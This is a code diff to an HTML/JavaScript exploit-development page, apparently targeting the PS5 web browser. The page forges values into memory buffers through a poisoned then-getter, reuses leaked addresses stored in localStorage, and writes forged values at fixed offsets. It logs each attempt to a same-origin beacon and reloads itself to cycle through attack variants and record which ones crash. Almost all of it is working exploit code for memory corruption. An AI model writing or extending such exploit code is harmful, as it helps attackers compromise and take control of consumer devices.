@@ -29,8 +29,13 @@
 
   Same discipline as p685: blind forge into all 16 buffers BEFORE the
   check() walk; NO beacon inside the poisoned then-getter; auto-cycle via
-  localStorage p686arm (crash restart advances one arm); prime values are
-  read from p685's stored T/impl (same origin).
+  localStorage p686arm (an arm load stores its successor before it runs, so
+  a death resumes there); prime values are read from p685's stored T/impl
+  (same origin).
+
+  v7 AUTO-WRAP: when CENSUS_CAP is reached, the page clears its counters,
+  clears the server-side census state via /p686reset=1 and immediately
+  re-enters the cycle. Works with PS5 root-only access (/? or / alone).
 
   CRASH_CLASS: HIGH (each arm load may die — that is the evidence)
 -->
@@ -40,6 +45,12 @@
 <script>
 (function(){
 'use strict';
+// v7 AUTO-WRAP: total-load budget. Counted at load start so that dying
+// loads also count; at CENSUS_CAP the page resets and enters the census.
+// The JS resets loadNo in localStorage, falls through to the main loop.
+var CENSUS_CAP=160;
+var loadNo=0;
+try{var _l=parseInt(localStorage.getItem('p686loads')||'0',10);loadNo=_l+1;localStorage.setItem('p686loads',String(loadNo));if(loadNo>CENSUS_CAP){loadNo=1;localStorage.setItem('p686loads','1');localStorage.removeItem('p686arm');localStorage.removeItem('p686phase');localStorage.removeItem('p686T');localStorage.removeItem('p686I');try{var rx=new XMLHttpRequest();rx.open('GET','/p686reset=1',false);rx.send();}catch(e){}}}catch(e){}
 var L=document.getElementById('log'),bQ=[];
 function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
 function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P686-'+encodeURIComponent(b),false);x.send();}catch(e){}}
@@ -64,7 +75,7 @@ try{
     if(!isNaN(stored))arm=stored;
   }catch(e){}
 })();
-emit('START','v1 arm='+arm+' died='+(diedSince?'arm'+deadArm:'no'));flush();
+emit('START','v7 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));flush();
 
 var priorT='',priorI='';
 // if the previous load died, its T/impl are addresses of the dead process
@@ -73,8 +84,14 @@ try{
   priorI=localStorage.getItem('p686I')||localStorage.getItem('p685I')||'';
 }catch(e){}
 if(diedSince){
-  emit('STATE','previous load (arm '+deadArm+') DIED — invalidating T/impl, re-priming');
+  emit('STATE','previous load (arm '+deadArm+') DIED — invalidating T/impl, re-prime');
   priorT='';priorI='';
+  // No arm advance here. An arm load stores its successor in localStorage
+  // before it runs (arm-mode block below), so storage already points at the
+  // arm to resume. A dead prime stores nothing and must be retried at the
+  // same label. Advancing in this branch skipped one arm per death and, with
+  // a hardcoded cap, silently dropped every arm past it.
+  emit('STATE','resume arm '+arm+' (dead '+deadArm+')');
 }
 if(priorT)emit('PRIOR-T',priorT);else emit('PRIOR-T','none');
 if(priorI)emit('PRIOR-I',priorI);else emit('PRIOR-I','none');
@@ -148,8 +165,9 @@ if(primeMode){
     emit('ARM','off=0x68 delta='+delta+' val=0x'+forgeVal);
   }
   var nxt=arm>=ARMS.length-1?0:arm+1;
-  // advance the arm ONLY on arm-mode loads; an arm death still counts as
-  // its observation and the post-death re-prime resumes at deadArm+1
+  // An arm load stores its successor BEFORE it runs: if this load dies, the
+  // reload resumes at nxt and nothing else has to advance the counter.
+  // Prime loads store nothing, so a dead prime is retried at its own label.
   try{localStorage.setItem('p686arm',String(nxt));}catch(e){}
   emit('SEQ','next arm = '+nxt+' delta='+dlabel(nxt));
 }
@@ -236,12 +254,11 @@ setTimeout(function(){
         // p685-era keys are values of possibly-dead processes; this prime's
         // values are the only truth now
         localStorage.removeItem('p685T');localStorage.removeItem('p685I');
-        // resume the census at the arm AFTER the one that died (wrap at 9)
-        if(deadArm!==null){
-          var resume=deadArm>=ARMS.length-1?0:deadArm+1;
-          localStorage.setItem('p686arm',String(resume));
-          emit('SEQ','resume plan: next load = arm '+resume);
-        }
+        // No arm write here. The death is reported so this load re-primes,
+        // but the resume label comes from the last arm load's stored
+        // successor. Writing deadArm+1 here skipped one arm whenever the
+        // dead load was a prime (a prime must be retried at its own label).
+        if(deadArm!==null)emit('SEQ','dead arm '+deadArm+' — resume label comes from stored successor');
       }catch(e){}
       emit('STORED','T='+qw(v,0x58)+' I='+qw(v,0x68));
     }
@@ -251,6 +268,9 @@ setTimeout(function(){
   flush();
   emit('DONE','arm='+arm);
   flush();
+  // v7 AUTO-WRAP: this load survived, so the WebProcess is healthy and
+  // can schedule the next load itself. A load that dies never reaches here.
+  setTimeout(function(){location.reload();},900);
 },150);
 
 })();
